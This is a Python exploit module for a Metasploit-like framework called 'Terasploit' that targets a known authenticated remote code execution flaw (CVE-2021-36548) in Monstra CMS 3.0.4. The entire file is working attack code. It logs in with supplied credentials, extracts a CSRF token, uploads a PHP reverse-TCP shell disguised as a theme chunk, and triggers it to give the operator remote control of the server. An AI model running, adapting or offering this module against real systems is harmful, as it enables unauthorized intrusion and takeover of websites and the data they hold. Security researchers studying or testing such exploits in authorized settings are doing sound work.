#######
# Module/Exploit: Monstra CMS Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Name'        : 'Monstra CMS Authenticated Remote Code Execution',
                'Version'     : '3.0.4',
                'Module'      : Module.exploit,
                'Payload'     : 'modules/payload/php/shell_reverse_tcp',
                'Arch'        : Arch.PHP,
                "Platform"    : Platform.PHP,
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                ],
                'Description' : [
                    'A remote code execution (RCE) vulnerability in the component /admin/index.php?',
                    'id=themes&action=edit_template&filename=blog of Monstra v3.0.4 allows attackers',
                    'to execute arbitrary commands via a crafted PHP file.'
                ],
                'Reference'   : [
                    'CVE-2021-36548',
                    'https://nvd.nist.gov/vuln/detail/CVE-2021-36548',
                    'https://www.exploit-db.com/exploits/52038'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptProxy.create('proxy',['','no','json file containing proxies, json format {"protocol":"proxy",...}']),
            OptBool.create('ssl_verify',['false','no','check ssl certificate on the host']),
            OptString.create('username',['','yes','username to use for authentication']),
            OptString.create('password',['','yes','password to use for authentication'])
        ])


    def login(self) -> bool:
        _, proxy, verify, username, password = self.OPT()
        
        print_info ('Logging in using specified credentials...')
        login_response = HTTP.session.post(
            url=f'{Target.scheme}://{Target.hostname}/admin/index.php?id=dashboard',
            data={'login':username,'password':password,'login_submit':'Log+In'},
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(verify)
        )
        return True if 'Dashboard' in login_response.text else False


    def csrf_token(self) -> tuple[any,bool]:
        _, proxy, verify, _, _ = self.OPT()
        
        print_info ('Accessing edit page to find CSRF token.')
        edit = HTTP.session.get(
            url=f"{Target.scheme}://{Target.hostname}/admin/index.php?id=themes&action=add_chunk",
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(verify)
        )
        token_search = re.search(r'input type="hidden" id="csrf" name="csrf" value="(.*?)"',edit.text)
        if token_search:
            return token_search.group(1), True
        else:
            return None, False


    def exploit(self) -> str|None:
        payload, _ = Get.payload()
        target, proxy, verify, _, _ = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f'{Target.scheme}://{Target.hostname}/public/themes/default/{rand}.chunk.php')
        
        try:
            if self.login():
                token, boolean = self.csrf_token()
                if boolean:
                    exploit = HTTP.session.post(
                        url=f"{Target.scheme}://{Target.hostname}/admin/index.php?id=themes&action=add_chunk",
                        data={'csrf':token,'name':rand,'content':shell,'add_file':'Save'},
                        proxies=self.GetProxy(proxy),
                        verify=self.GetBoolean(verify)
                    )
                    if exploit.status_code in self.good_status_code():
                        print_info (f'Uploaded: {Shell.get()}', type="GREEN")
                        print_info ('Attempting to execute payload...')
                        HTTP.Request('get',url=Shell.get(),timeout=20)
                        return
                    else:
                        print_info (f'Exploit failed, status code: {exploit.status_code}',type='red')
                        return 'failed'
                else:
                    print_info ("Exploit failed, can't find CSRF token") 
                    HTTP.new_session()
                    return 'failed'
            else:
                print_info("Failed to login using specified credentials")
                HTTP.new_session()
                return 'failed'

        except Exception as error:
            print_info (error,type='red')
            HTTP.new_session()
            return 'failed'